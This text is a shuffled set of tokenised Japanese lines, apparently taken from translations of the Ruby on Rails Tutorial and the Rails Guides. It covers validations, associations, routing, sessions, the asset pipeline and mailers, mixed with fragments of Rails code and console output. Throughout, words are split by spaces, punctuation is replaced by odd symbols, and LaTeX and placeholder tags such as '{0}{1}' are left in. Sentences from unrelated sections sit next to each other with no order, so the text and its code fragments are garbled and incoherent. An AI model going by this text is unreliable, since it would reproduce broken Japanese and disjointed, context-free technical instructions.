おそらく 最も 基本 的 な バリデーション は 「 \emph { 存在 性   ( Presence ) } 」 で す ▟ これ は 単に 、 与え られ た 属性 が 存在 する こと を 検証 し ま す 。
これ ら の コード に よ り 、 ユーザー プロファイル を 表示 し て 、 ページ を 更新 せ ず に フォロー また は フォロー 解除 が でき る よう に な っ た はず で す 。
# '/assets ' の デフォルト
Article ▖ first ▖ categories ▖many?
( Rails の ログ に エラー が 出力 さ れ ま す が 、 害 は 生 じ ま せ ん ) 。
これ に よ り 、 与え られ た   _ 主キー _   に マッチ する レコード を すべて 含 む 配列 が 返 さ れ ま す 。
メール アドレス の 一意 性 を 強制 する ため に   ( ユーザー 名 と し て 使 う ため に ) 、 \kode { validates } メソッド の \ kode {:unique } オプション を 使 い ま す 。
</tt >   is  true ,
多く の 場合 、 コード を 書き進め る うち に 肥大 化 し たり 繰り返し が 増え たり し て 、 いつ し か 「 悪臭 を 放 つ 」 醜悪 な コード に な り は て る もの で す 。
ヒント は 、 Message モデル と 、 新規 マイクロ ポスト に マッチ する 正規 表現 で す 。
アカウント を 有効 化 する \ kode {edit } アクション
TIP:   Active   Record の 関連 付け の 詳細 に つ い て は 、 [ Active   Record の 関連 付け ( アソシエーション ) ] ( association_basics▖html ) ガイド を 参照 し て くださ い 。
使用 する プラグ イン は すべて gem に 展開 し て Gemfile に 追加 し な けれ ば な り ま せ ん ▟  
#  matter  the  context ▖  
圧縮 する こと に よ っ て も ファイル サイズ が 小さ く な り 、 ブラウザ へ の 読み込 み 時間 が 短縮 さ れ ま す 。
( Factory   Girl は テスト 環境 で しか 使用 し な い の で 、 以下 の よう に \ kode {: test } グループ に 追加 し ま す ) 。
Rails が 生成 する デフォルト の scaffold に よ っ て 、 以下 の CSS ルール が 追加 さ れ ま す 。
もし 多数 の 静的 な ページ が 必要 に な る 場合 は 、 \ href {https://github▖ com/thoughtbot/high _voltage}{\ texttt { high _voltage} }  gem   を 調べ て み て くださ い 。
 — 「 \emph { Foun ders at  Work} 」 ( Jessica   Livingston 著 )   の Paul   Graham の 言葉 。
\ ref{ sec : adding _ page_titles } の テスト を 実行 し て この 改修 を 確認 すれ ば 、 今度 も   \ passing   に な る はず で す 。
#   gem  ' capistrano' , group : : development
( ユーザー を 削除 し た ら 、 ユーザー の リレーションシップ も 同時 に 削除 さ れ る 必要 が あ り ま す ▟ その ため 、 関連 付け に \ kode {dependent :  : destroy } も 追加 し て い ま す ▟ )
この メソッド 1 つ だけ で セキュア な パスワード の 実装 が ほとんど 終わ っ て しま う の で 、 逆 に この 機能 を 一 から 手作り する の は 簡単 で は あ り ま せ ん 。
= >  true
It's  an  empty  string !
\ kode {rails } スクリプト は 、 \ kode {bun dle   exec } なし で 動作 する 設計 に な っ て い ま す 。
NOTE :   この 値 は シンボル に する こと は でき ま せ ん 。
今度 は 、 \emph { リポジトリ } を 作成 する たび に 必要 な 作業 を 行 い ま す 。
ファイル の コピー
\ kode {remember\_digest } 属性 を 追加 し た User モデル
}╼╼\ section { Account   activation } %  ( fold) ╼\ label{ sec : account_activation}╼╼
クラウド IDE で は 以下 の 操作 を 行 い ま す 。
Rails は 巨大 プロジェクト で あ り 、 異質 な コミット が 多数 加わ る と 膨大 な ノイズ が 生じ る 可能 性 が あ り ま す 。
    <% end   %>
#   アセット の バージョン を 指定 する ▟ アセット を すべて 期限 切れ に し た い 場合 は この 値 を 変更 する 。
\ ref{ sec : forgetting _ users } の コード で 、 アプリケーション に プロ 仕様 の 完全 な 認証 システム が 導入 さ れ ま し た 。
前述 の とおり 、 ` ren der ` は レスポンス 構成 時 に どの ビュー   ( また は 他 の アセット )   を 使用 する か を 指定 する ため の もの で す 。
  >> @user  = @user || " another  user "
#### ` has _one ` の スコープ に つ い て
" comments_count " ▖ humanize               # =>  " Comments  count "
  リスト \ ref{ code :relationships_fixtures } の fixture で は 、 前半 の 2 つ で Michael が Lana と Mallory を フォロー し 、 後半 の 2 つ で Lana と Archer が Michael を フォロー し て い ま す 。
Users リソース   ( \ href { http://local host : 3000 / users }{/ users } )   ページ の 最初 の 状態
resource   : geocoder
本節 と 次 の 節 で は 、 セッション 機能 を 作成 する 準備 と し て 、 Session コントローラ 、 ログ イン 用 の フォーム 、 両者 に 関連 する コントローラ の アクション を 作成 し ま す 。
` duplicable ? ` メソッド は 、 上 の ハード コード さ れ た リスト に 依存 し ま す が 、 その 代わり ` rescue ` より ずっと 高速 で す 。
<%=   javascript_ include_tag   "main " ,  " columns "  %>
\ kode {session } メソッド を 使用 する と 、 ユーザー ID を 安全 に ブラウザ に 保存 し て 一時 セッション を 作成 でき ま す 。
マイクロ ポスト 作成 用 の 新し い ファクトリー を 含 む 、 完全 な Factory ファイル 。
    <html >
たとえば 、 Rails に よ っ て 作成 さ れ る ログ ファイル は 頻繁 に 内容 が 変わ る の で 、 いちいち バージョン 管理 に 更新 さ せ た く あ り ま せ ん 。
+ ------ +--------- +------ +------ +------------- +
NOTE :   返 さ れ る の は ` optgroup ` タグ と ` option ` だけ で す ▟ 従 っ て 、 出力 結果 の 外側 を 適切 な ` select ` タグ で 囲 む 必要 が あ り ま す 。
上 の Cucumber の コマンド を 、 下 の RSpec の コマンド と 比較 し て み て くださ い 。
Web アプリケーション を 開発 用 の PC で 実際 に 動か し て この こと を 確かめ て み ま しょ う 。
    has_many  : orders ,  -> { extending   FindRecentExtension   }
この 節 の 内容 は 必須 で は あ り ま せ ん の で 、 スキップ し て も 問題 あ り ま せ ん 。
この フィールド 用 の ` attr_accessor ` も 設定 する 必要 が あ り ま す ▟ これ に よ り 、 この フィールド 用 の ゲッター と セッター が 定義 さ れ ま す 。
\ kode {hello_app } ディレクトリ に あ る デフォルト の \ kode { Gemfile } 。
\ kode {user } に 紐付 い て い て 、 \ kode {id } が \ kode { 1 } で あ る マイクロ ポスト を 検索 する
マイクロ ポスト を フィード でき な い
この とおり に でき た 場合 は 、 この 節 の 残り は スキップ し て くださ い 。
アカウント 有効 化 メール の 場合   ( \ ref{ sec : account_activation_emails } )   と 同様 、 Rails の メール プレビュー 機能 で パスワード 再 設定 の メール を プレビュー し ま しょ う 。
#   app/mailers/user_mailer▖ rb
( システム 環境 に よ っ て は 、 ここ で Rails を 再 起動 さ せ る 必要 が あ る か も しれ ま せ ん ▟ )
    has_many  : orders
1 )              # =>  ArgumentError
この コード は リスト \ ref{ code : signup_errors_updated } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
( この とき 、 Spring サーバー に 接続 でき な い など の エラー が 表示 さ れ る こと が あ り ま す 。
###  最初 の フォーム
上 の ルーティング は 、 `/photos/ show / 1/with _user / 2 ` の よう な パス に マッチ し ま す ▟ ` with _user ` の 部分 は 固定 さ れ て い ま す 。
    has_many  : physicians ,   through :  : appointments
  =>  - 1
      </p>
>I  like   the   way   you' ve   restructured   that   code  in   generate_finder_sql  -   much  nicer ▖   ( generate_finder_sql の コード が 非常 に よ い 形 で 再 構築 さ れ て い る 点 が よ い と 思 い ま す ) 。
File ▖atomic _write ( joined_asset_path )   do  | cache|
=>  " mznpybuj "
\ kode { full_title } ヘルパー を 定義 する
     w here ( " created_at < ? " , time)
NOTE :   Coffee Script を 使用 する に は 、 ExecJS が ラン タイム で サポート さ れ て い る 必要 が あ り ま す 。
続 い て 、 メール で の 通知 機能 を オプション と し て 選択 可能 に し 、 不要 な 場合 は 通知 を オフ に でき る よう に し て み ま しょ う 。
マイクロ ポスト 投稿 フォーム の パーシャル
次 の 章 に 進 む 前 に 、 変更 を master ブランチ に マージ し て お き ま しょ う 。
```css
第 1 章 で は 、 最初 に 必要 な ソフトウェア を インストール し 、 開発 環境   ( \ ref{ sec : up_and _running } )   を 整え て Ruby   on   Rails を 動か す 準備 を し ま す 。
# =>  NoMethodError :  undefined   method  ` limit '   for  # < Array : 0 x 0 07 ff 34d 3 ad 6 d 8 >
上 の コード は どこ か で 見 た こと が あ る と 思 っ た ら 、 それ も その はず 、 Capybara で す ▟ Capybara は デフォルト で Cucumber の ステップ ファイル に 含 ま れ ま す 。
     followers
と い っ た 行 が あ り ま す が 、 これ は 次 の コード と 等価 に な り ま す 。
### ` has_many : through ` 関連 付け
<%=   link_to   " Delete  article " , @ article ,   remote:  true ,   method :  : delete  %>
マイクロ ポスト の コンテンツ が 存在 し て い る か どう か の バリデーション コード
開発 環境 を あれこれ 整え 始め る と 、 「 すべて の ツール を 自在 に 使 い こな す に は \emph { かなり } 長 い 時間 が かか り そう だ 」 と 実感 する こと で しょ う 。
scope   module :  ' admin '  do
新し い アプリケーション で は これ が デフォルト に な り ま す 。
      t ▖integer   : supplier_ id
以下 に 例 を 示 し ま す 。
date  =  DateTime▖ new (2010 ,   6 ,   7 ,   19 ,  55 ,   25 )
たとえば 、 患者 ( patient ) が 医師 ( physician ) と の 診察 予約 ( appointment ) を 取 る 医療 業務 を 考え て み ま す 。
Rails で は リソース ルーティング を 行な う 他 に 、 任意 の URL を アクション に ルーティング する こと も でき ま す 。
<ul   id= " users " >
これ は リスト \ ref{ code :contact _ page_test } で 使用 さ れ て い ま し た 。
本 の 中 で 、 与え られ た 言葉   ( 例えば 、 “ foobar ” )   が 出 て くる 箇所 を すべて 見つけ る ため に は 、 ページ を 端 から 順 に めく っ て 最後 まで 探 す 必要 が あ り ま す 。
53 ▖ordinal    # => " rd "
Date:   Sun ,   24   Aug  2014   20 : 27 : 50   GMT
     X 1   =   : overrides_X 1_above
Time ▖utc ( 158 2 ,   10 ,   3 )   +   5 ▖ days
これ は リスト \ ref{ code : users _migration } で 使用 さ れ て い ま し た 。
画像 を リサイズ する ため に 画像 アップ ローダー を 修正 する
パスワード の 最小 文字 数 を テスト する   (  \failing   )
       create   app/controllers/static _ pages_controller▖ rb
\ kode {Micropost } モデル を 以下 の よう に 直接 使用 し て \ kode {correct _user } フィルタ を 実装 する こと も でき ま す 。
生成 さ れ た 行 が 多 過ぎ る   ( 200 行 を 超え る )   場合 、 コメント を 呼び出し の 上 に 置 い て くださ い 。
NOTE :   エンコーディング の 種類 を 指定 する と 、 Mail は コンテンツ が 既に エンコード 済み で あ る と 判断 し 、 Base 64 に よ る エンコード を 行 い ま せ ん 。
Author ▖ joins(:articles ) ▖ w here ( articles : {  author :   author   } )
  >>  Rails ▖env▖ development ?
Git に よ る バージョン 管理 を 導入 し 、 Bitbucket の 非 公開 リポジトリ に プッシュ する 理由 は 、 データ の 喪失 を 防止 し 、 他 の 開発 者 と の 共同 作業 を 行え る よう に する ため 。
上 の 計算 は 、 以下 の 実行 前 と 実行 後 の 両方 で 行 わ れ ま す 。
                          password :  company▖ smtp _ password ,
( \ ref{ sec :a_controller_ class } で も 説明 し ま す が 、 コンソール から Rails 環境 に アクセス する こと も でき ま す ) 。
これ ら の マイ グレーション を アプリケーション に コピー する に は 、 以下 の コマンド を 実行 し ま す 。
####  範囲 条件
A  test   for   the  user   profile▖   { 2 } { 3 } { / 3 } { 3 } { 4} green { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
Java Script と 埋め込 み Ruby を 使 っ て フォロー の 関係 性 を 作成 する
パーシャル に よ っ て 、 Rails と Ruby に は 、 Rails エラー オブジェクト 用 の 2 つ の メソッド を 含 む 多く の 成果 物 が 導入 さ れ ま し た 。
         class   Foo
うれし い こと に 、 Rails エンジン は Rails アプリケーション と 大半 の 機能 を 共有 し て い る の で 、 これ ら は 完全 に 実現 可能 で す 。
      'some  class   method  string '
cookies の 各 要素 は 、 それ 自体 が 2 つ の 要素   ( \kode { value } と オプション の \ kode {expires } 日時 )   の ハッシュ に な っ て い ま す 。
user_ path ( @user )  # => " / users/ 357 - john - smith "
     create_table : articles   do  | t |
Relationship モデル の カラム を 入れ 替え て 作 っ た 、 フォロワー の モデル
  example\_user で 使用 する コード
A  test   of   \kode {authenticated ? } 
上 は フォーム から 送信 さ れ た パスワード で す 。
` collection_singular_ ids = ` メソッド は 、 指定 さ れ た 主 キー id を 持 つ オブジェクト の 集まり で コレクション の 内容 を 置き換え ま す ▟ 元 から あ っ た オブジェクト は 削除 さ れ ま す 。
\ ref{ sec :a_users _ resource } に は 別 の 例 も あ り ま す 。
Rails   4 で は 、 ` config/ routes▖rb ` で RESTful な リソース が 宣言 さ れ た とき に 、 更新 用 の 主要 な HTTP   verb と し て ` PATCH ` が 使用 さ れ る よう に な り ま し た 。
SELECT   DISTINCT   name   FROM   clients
ユーザー インデックス は とうとう 完了 し ま し た ▟ 残 る は \ kode { destroy } だけ で す ▟ これ を 実装 する こと で 、 REST に 準拠 し た 正統 な アプリケーション と な り ま す 。
この 動作 は 、 ` Enumerator #each_ with _object ` を 使用 し て 下位 の すべて の オブジェクト に ` deep_dup ` を 送信 する の と 似 て い ま す 。
class   Document  <  ActiveRecord : : Base
        #  保存 後 に User Mailer を 使用 し て welcome メール を 送信
まず は 、 リスト \ ref{ code :unsuccessful_edit_test } の テスト を 参考 に し て 、 ユーザー 情報 を 更新 する 正し い 振る舞い を テスト で 定義 し ま す   ( 今回 は 有効 な 情報 を 送信 する よう に 修正 し ま す ) 。
` form _ for ` ヘルパー は 、 これ を 見 て 何 の フォーム で あ る か を 知 る こと が でき ま す 。
# => < link  href = "/assets/all▖css "   media = " screen "   rel = " stylesheet "  />
場合 に よ っ て は ` has_and _belongs_to_many ` で 使用 さ れ る クエリ を カスタマイズ し た く な る こと が あ り ま す 。
╼╼╼    \ subsection { コンストラクタ } %  ( fold) ╼    \ label{ sec : constructors}╼╼
Ruby の 定数 表 記法   ( `controller :  'Admin : :UserPermis sions '` など )   を コントローラ に 対 し て 使用 する と 、 ルーティング で 問題 が 生 じ 、 警告 が 出力 さ れ る 可能 性 が あ り ま す 。
      'X - Frame - Options' => ' SAMEORIGIN ',
\ kode {rails server } を 実行 し た とき の デフォルト の Rails ページ 。
以下 の よう な 代入 文 を 三 項 演算 子 で 置き換え る こと も でき ま す 。
*   メイラー に ` receive ` メソッド を 実装 する
ハマ り やす い 手順 に つ い て は でき る だけ 情報 を 補 う よう に し て い ま す が 、 すべて の 場合 を カバー する の は 不 可能 で す 。
* `lock `
アリス は 誤 っ て   “ Submit ”   を 素早 く \emph {2 回 } クリック し て しま い ま す ▟ その ため リクエスト が 2 つ 連続 で 送信 さ れ ま す 。
    layout   " inventory "
*  `append_asset_paths`:   アプリケーション と 、 それ に 追加 さ れ て い る railties に 含 ま れ て い る アセット パス を 探索 し 、 ` config▖static _asset_paths ` で 指定 さ れ て い る ディレクトリ を 監視 し ま す 。
サイン イン 関連 の 作業 の 大半 は 、 この cookies を ベース に し て 認証 システム を 構築 する こと に な り ま す 。
Active   Record の 検索 メソッド に は ` joins ` が あ り 、 生成 さ れ た SQL で ` JOIN ` 句 を 使用 でき ま す ▟ ` joins ` メソッド に は さまざま な 使用 方法 が あ り ま す 。
   def  arel_table #: nodoc:
*  ` has_and _belongs_to_many`
  @@session_store   = store ▖ is _a ? (
Rails で は 「 設定 より 規約   ( CoC:  convention   over   configuration ) 」 と い う ポリシー が 推奨 さ れ て い る こと を ご 存 じ か と 思 い ま す 。
config ▖ assets▖enabled =  true
=> " Michael   Hartl  < mhartl@example ▖ com> "
この オプション は 、 ユーザー 入力 の ロケール が 不正 で あ る 場合 の セキュリティ 対策 で あ る ため 、 特別 な 理由 が な い 限り 無効 に し な い で くださ い 。
class Blorgh : : Article <  ActiveRecord : : Base
  $ rails   generate  model   Foo  bar: string   baz : integer
中身 の あ る ディレクトリ の 削除
この メソッド に は ` : remote ` オプション が あ り 、 以下 の よう に 使用 でき ま す 。
Use  `bun dle   show   [ gemname ] `  to  see   w here   a  bun dled   gem   is   installed ▖
\ subsection { Backtrace サイレンサー } %  ( fold) ╼ %
#### sanitize
実 は 、 この specify は \ kode {it } と 同義 で あ り 、 \ kode {it } を 使用 する と 英語 と し て 不 自然 な 場合 に これ で 代用 する こと が でき ま す 。
   'X - Frame - Options' => ' DENY '
concern : commentable  do
完全 な HTML 構造 を 備え た Home ページ の ビュー
` app/assets/javascripts/blorgh/articles ▖js ` と
現在 形 で 書 く こと ▟ " Returned  a   hash  that ▖▖▖ "  や   " Will  return  a   hash  that ▖▖▖ "   で は な く " Returns   a   hash  that ▖▖▖ " の よう に 書 く 。
詳細 に つ い て は [ Rails アプリケーション を 設定 する ] ( configuring ▖ html )   を 参照 し て くださ い 。
最初 の コマンド は 、 現在 の メイン   ( \emph {master } )   ブランチ 用 の   " origin "   と し て GitHub に 追加 し ま す ▟ 次 の コマンド で 実際 に   GitHub に プッシュ し ま す
この バリデーション ヘルパー は 仮想 の 属性 を 作成 し ま す ▟ その 属性 の 名前 は 、 確認 し た い 属性 名 に  "_confirmation "   を 追加 し た もの に な り ま す 。
" : : Inflections " ▖ demodulize                  # => " Inflections "
この 方式 を 使用 する 場合 、 リソース フル ルーティング の よう な 自動 的 な ルーティング グループ の 生成 は 行 わ れ ま せ ん 。
*  ` action_dispatch▖ configure` : ` ActionDispatch : :Http: : URL ▖tld_length ` を 構成 し て 、 ` config▖ action_dispatch▖tld_length ` の 値 ( トップ レベル ドメイン 名 の 長 さ ) が 設定 さ れ る よう に し ま す 。
渡 さ れ た ユーザー を \ kode {remember } メソッド で 記憶 する
完全 な テスト 機能 を 備え た 強力 な Web フレームワーク が な かっ た 頃 は 、 テスティング 作業 は 苦痛 に 満 ち 、 しばしば そこ で エラー が 発生 し ま し た 。
##### ` collection▖build ( attributes = {}, ▖▖▖)
resources  : videos
` rails server ` コマンド は ` Rack : : Server ` の オブジェクト を 作成 し 、 ウェブ サーバー を 起動 し ま す 。
個別 の 属性 に 関連 する エラー メッセージ を 追加 する 代り に 、 オブジェクト の 状態 全体 に 関連 する エラー メッセージ を 追加 する こと も でき ま す 。
beginning
次 の { 0 } { 1 } 第 4 章 { / 1 } { / 0 } で は 少し 回り道 を し 、 Rails を 支え て い る Ruby と い う 言語 に つ い て 簡単 に 学 び ま す 。
拡張 子 が 指定 さ れ て い な い 場合 は 、 `▖css ` が 自動 的 に 補 わ れ ま す 。
" # { module_name }Helper "
なお 、 \ kode {=> nil }   と い う 結果 は 、 簡素 化 の ため に 今後 省略 する こと が あ り ま す 。
#   The   following   optional   lines are   part   of  the   advanced  setup ▖
パスワード 再 設定 の テンプレート   ( テキスト メール )
email インデックス を 追加 する と 、 データ モデリング の 変更 が 必要 に な り ま す ▟ Rails で は   ( \ ref{ sec : database_migrations } で 見 た よう に )   マイグレーション で インデックス を 追加 し ま す 。
` Time ` の 拡張
アダプタ が 設定 さ れ て い な い 場合 、 ジョブ は 直ちに 実行 さ れ ま す 。
以下 の 結果 を 得 ま す 。
また 、 scaffold を 使用 し て 生成 を 行な う と 、 その モデル の エラー メッセージ を すべて 表示 する ERB が Rails に よ っ て 一部 の ` _ form ▖html ▖erb ` ファイル に 追加 さ れ ま す 。
####  XML を 出力 する
#  config/application ▖ rb
この メソッド を 実行 し て も オブジェクト は destroy さ れ ま せ ん 。
フレンド リー フォワーディング の 実装
    if   some_ complex_ condition_involving _ ivars_and _private_methods ?
<html >
NOTE :   アセット パイプライン の : cache オプション と : concat オプション は 廃止 さ れ ま し た ▟ これ ら の オプション は ` javascript_ include_tag ` と `stylesheet_link_tag ` から 削除 し て くださ い 。
まず は \ kode {setup } の ステップ で 、 fixture の サンプル ユーザー と 紐付け た 新し い マイクロ ポスト を 作成 し て い ま す ▟ 次 に 、 作成 し た マイクロ ポスト が 有効 か どう か を チェック し て ま す 。
モデル の 状態 を 確認 し 、 無効 な 場合 に ` errors ` コレクション に メッセージ を 追加 する メソッド を 作成 する こと が でき ま す 。
この 呼び出し を 避け る ため に 、 「 従属 し て い る 方 の モデル ( ` belongs_to ` を 宣言 し て い る 方 の モデル ) 」 に カウンタ キャッシュ を 追加 する こと が でき ま す 。
class   CreateCustomers <  ActiveRecord : : Migration
マイクロ ポスト の データ モデル は ユーザー より も さらに シンプル で す ▟ \ kode {id } と マイクロ ポスト の テキスト 内容 を 格納 する \ kode {string } 型 の \ kode {content } だけ で 構成 さ れ て い ま す
この オプション が 効 く の は ` config▖ cache_classes ` が true の 場合 のみ で す (` config▖ cache_classes ` は production モード で は デフォルト で true で す ) 。
これ は リスト \ ref{ code :rails_ command } で 使用 さ れ て い ま し た 。
<%=   form _ for  : article   do  | f| %>
*  `ren der ` を 呼び出 し 、 ブラウザ に 返 す 完全 な レスポンス を 作成 する
` collection ▖ size ` メソッド は 、 コレクション に 含 ま れ る オブジェクト の 数 を 返 し ま す 。
単純 な 場合 で あ れ ば 、 モデル 名 に `tableize ` を 使用 する と モデル の テーブル 名 を 得 られ ま す 。
デフォルト の エラー メッセージ は 、 実行 さ れ る バリデーション の 種類 に よ っ て 異な り ま す 。
最後 の 2 つ の ステップ で は 、 テスト 用 の データベース に 31 人 以上 の ユーザー が い る 必要 が あ り ま す 。
この 節 で は 、 以後 この モデル 用 ファイル を 理解 する こと に 専念 し ま す 。
テスト ヘルパー に ` ActiveRecord : : Migration ▖ check _pending ! ` の 呼び出し が あ る 場合 、 これ を 削除 する こと が でき ま す 。
コントローラ の アクション を 追加 し たり 、 ルート ルーティング を 変更 し たり する だけ で 「 hello ,   world 」 アプリケーション を 作成 でき る 。
これ で ユーザー 一覧 ページ が 動 く よう に な っ た の で 、 \ ref{ sec : pagination } の ページ ネーション に 対 する 簡単 な テスト も 書 い て お き ま しょ う 。
Rails は この リクエスト を ` photos ` コントローラ 内 の ` destroy ` アクション に 割り当て 、 ` params ` ハッシュ に `{   id :  ' 17 '  }` を 含め ま す 。
Relationships コントローラ が Ajax リクエスト に 応答 する こと を テスト する 。
この 方法 は ポリ モー フィック リレーションシップ で も 同様 に 使用 でき ま す 。
上 の 文 は 以下 の よう に 書 く こと も でき ま す 。
     has_many : comments
削除 リンク を 追加 し た ユーザー 一覧 の モックアップ
ここ で は 、 以下 の よう に rake コマンド で マイグレーション を 実行 し ま す 。
|                     |  412                | : precondition_failed             |
ren der  " products/show "
  <%=  f ▖ label  : body ,   ' Body' %>:
###  カスタム メソッド
従 っ て 、 こう し た コード を すべて 自分 で 作成 する 必要 は ほとんど あ り ま せ ん 。
{ 0 } 図 11 ▖ 6 { / 0 }   { 1 } ユーザー プロフィール と スタイル の な い マイクロ ポスト { / 1 }
Rails   4 ▖ 1 より 前 に 作成 さ れ た アプリケーション で は 、 ` Marshal ` を 使用 し て cookie 値 を 署名 済 み また は 暗号 化 し た cookies jar に シリアライズ し て い ま し た 。
    i  =   Item▖ lock ▖ first
この 設定 を 定義 する に は 、 エンジン で 使用 する ` Blorgh ` モジュール 内部 に ` mattr_accessor ` と い う アクセッサ を 置 く 必要 が あ り ま す 。
# => <option > VISA < /option> <option > MasterCard < /option >
身近 に Rails 使 い がい る 場合 は 、 送信 前 に コード を 詳し く チェック し て もら い ま しょ う 。
ユーザー を 作成 する   ( ユーザー 登録 )   場合 と 同様 、 セッション を 作成 する 場合   ( サイン イン )   で 最初 に や る こと は 、 \emph { 正し く な い } 入力 の 取り扱い で す 。
話 を 簡単 に する ため 、 記事 の フォーム の テキスト フィールド は ` author_ name ` と する こと に し ま す ▟ 記事 を 書 く ユーザー が ここ に 自分 の 名前 を 入れ られ る よう に し ま す 。
( Git を 導入 し た の は 、 まさに この Heroku で 使 う ため で も あ り ま す ▟ まだ Git を インストール し て い な い 方 は \ ref{ sec : version_control } を 参照 し て くださ い ) 。
{ a :   1 } ▖ with _indifferent_access [ " a " ]  # = >   1
これ は リスト \ ref{ code : account_activation_and _ password _ resets } で 使用 さ れ て い ま し た 。
リレーション に 対 し て も 直接 実行 さ れ ま す 。
config ▖ assets▖ compile  =  false
たとえば 、 \ ref{ sec : rails_server } で は 以下 の \ kode {rails server } コマンド で ローカル development   Web サーバー を 実行 し て い ま す 。
*   以下 の アプリケーション 設定 を 変更 し て お く こと 。
strip_links ( 'Blog :  <a   href = " http://myblog ▖ com/" > Visit </a>▖')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa "
この とき 、   リスト { p 0 } の { 2 } destroy{ / 2 } メソッド で は リダイレクト を 使 っ て い る 点 に 注目 し て くださ い 。
そして \emph { Ruby   on   Rails チュートリアル } で は 、 複雑 さ を 避け る ため に \ href { http://c 9 ▖ io /}{ Cloud 9 } と い う 素晴らし い クラウド IDE サービス を 使 っ て 進め て い き ま す 。
デフォルト で 作成 さ れ る RESTful な ルーティング は 7 つ で す が 、 7 つ で な けれ ば な ら な い と い う こと は あ り ま せ ん 。
バック トレース 出力 を 絞り込 ん で 不要 な 行 が 表示 さ れ な い よう に し た い 場合 は 、 \ ref{ sec : backtrace _ silencer } を ご覧 くださ い 。
マイクロ ポスト 用 の コード の あ る ユーザー プロフィール ページ   ( ただし マイクロ ポスト が な い )
依存 し て い る オブジェクト を 作成 / 削除 する とき は 、 常 に 関連 付け を 通 す よう に する こと で 、 より セキュア な 操作 が 実現 でき る
有効 で な い ユーザー が ログ イン する こと の な い よう に する
\ kode { name } の 長 さ の 検証 に 対 する テスト  
c 1 ▖ first _ name  =   " Michael "
scaffold を 使用 し て リソース を 生成 する とき に 、 Rails が デフォルト で どんな こと を 行な う の か 見 て み ま しょ う 。
Rails   4 ▖ 1 で は 、 Rails 自身 の エンコーダ を JSON   gem から 切り離 す こと で これ ら の 問題 が 修正 さ れ ま し た 。
リレーションシップ と い う パズル の 最後 の 一 片 は 、 \ kode {user ▖ followers } メソッド を 追加 する こと で す ▟ これ は 上 の \ kode {user ▖ following } メソッド と 対 に な り ま す 。
    <td ><%=   a %></td>
\ kode {about } アクション が 追加 さ れ た StaticPages コントローラ 。
短 い 要約 文   ( 50   文字 以下 だ と 理想 的 )
#### ` assert_ routing ` アサーション
#     -- seed   123 4
      #  ここ で は メール の インスタンス や
エンジン を 1 つ だけ マイグレーション し た い 場合 、 以下 の よう に ` SCOPE ` を 指定 し ま す 。
これ は 、 ユーザー を 30 人 も 作成 する と システム に よ っ て は 速度 が 低下 する こと が あ り 、 それ を 防 ぐ ため の もの で す 。
これ は リスト \ ref{ code :sessions _helper_ include } で 使用 さ れ て い ま し た 。
他 の 認証 用 機能 と 同様 に 、 \ kode { sign _out } も Sessions ヘルパー モジュール の 中 に 置 き ま す 。
これ は ` via :  : all ` の 適切 な 利用 法 で す ▟ と い う の は 、 適切 と 考え られ る すべて の HTTP 動詞 を Rack アプリケーション で 扱え る よう に でき る から で す 。
Heroku の コマンドライン インターフェイス   ( CLI )   が インストール さ れ て い る こと が 確認 でき た ら 、 いよいよ \ kode { heroku } コマンド で ログ イン し て SSH キー を 追加 し ま す 。
この エラー は 、 明示 的 に 定義 さ れ た 名前 付き ルート や ` resources ` メソッド に よ っ て トリガ さ れ ま す 。
[ Active   Record は Martin   Fowler に よ っ て ] ( http://www ▖martinfowler▖ com/eaaCatalog/activeRecord ▖html )  _ Patterns   of   Enterprise   Application   Architecture_  と い う 書籍 で 記述 さ れ ま し た 。
あらかじめ RailsCast 「 \ href { http://railscasts▖ com/episodes/37 - simple- search - form }{ 簡単 な 検索 フォーム }   ( 英語 ) 」 を 参照 し て お く と よ い で しょ う 。
それ ら の HTML 要素 に Ajax コード を 若干 追加 し た く な っ た とき に も 、 Rails が ちゃんと サポート し て くれ ま す 。
本書 で は 以後 、 この アプリ の 良 い 点 を 保 ち つつ 、 弱点 を ひと つ ひと つ 克服 し て い き ま す 。
その ぐらい   \ href { http://railscasts▖ com/}{\emph { RailsCasts}}  は お 勧め で す 。
` Hash ` の 拡張
修正 さ れ た Help ページ
< / form >
最後 に 、 { 0 } { 1 } 第 10 章 { / 1 } { / 0 } で メール アドレス を 使 っ て アカウント を 有効 化 する 方法 と 、 パスワード を リセット する 方法 に つ い て 学 び ま す 。
検索 メソッド で 実行 さ れ る SQL に ` GRO UP   BY ` 句 を 追加 し た い 場合 は 、 `group ` メソッド を 検索 メソッド に 追加 でき ま す 。
ren der   " edit "
さらに 、 複数 の レコード を 一 度 に 更新 し た い の で あ れ ば 、 ` update_all ` と い う クラス メソッド が 便利 で す 。
コード が 重複 し な い よう 、 \ kode { signed_ in_user } を Users コントローラ から も 削除 し て お き ま しょ う 。
この とき は 、 本書 が 提供 する テスト コード と 、 テスト スイート が パス する まで エラー メッセージ の 修正 を 繰り返 す と い う 方法 だけ を 頼り に 作業 を 進め ま し た 。
リスト \ ref{ code : logged_ in_p } を 追加 し た の で 、 ユーザー の ログ イン 時 に レイアウト を 変え られ る よう に する 準備 が でき ま し た 。
リスト \ ref{ code : password _ migration } で は 、 \ kode { add_ column } メソッド を 使 っ て \ kode { users } テーブル \ kode { password_digest } カラム を 追加 し て い ま す 。
╼╼    \ subsection { ハッシュ 化 さ れ た パスワード } %  ( fold) ╼    \ label{ sec :a_hashed_ password } ╼╼
なお 、 Windows の コマンド プロンプト で は 、 ディレクトリ の 区切り は 次 の よう に バックス ラッシュ また は 円 マーク で 表示 さ れ ま す 。
c ▖ first _ name  = =  o▖ customer▖ first _ name  # => false
クラス の \ kode {new } メソッド を 呼び出 し た 結果 は 、 その クラス の オブジェクト で あ り 、 これ は クラス の \emph { インスタンス } と も 呼 ば れ ま す 。
### ` validates_with `
    date:
    after_ action  : set_ delivery _ options ,
これ は 、 プログラマ に と っ て は 便利 な 方法 で す が 、 本番 環境 に と っ て は 非 効率 で す 。
リスト \ ref{ code :sendgrid_config } に 示 し た とおり 、 本番 Web サイト の アドレス を \ kode { host } 変数 に 定義 する 必要 も あ り ま す 。
レイアウト に shim と header の パーシャル を 追加 する
Item Update   ( 0 ▖ 4 ms )     UPDATE   `items`   SET   ` updated_at` =  '2009 - 0 2 - 0 7   18 : 0 5 : 56 ' ,  ` name ` = ' Jones '  WHERE   ` id `  =   1
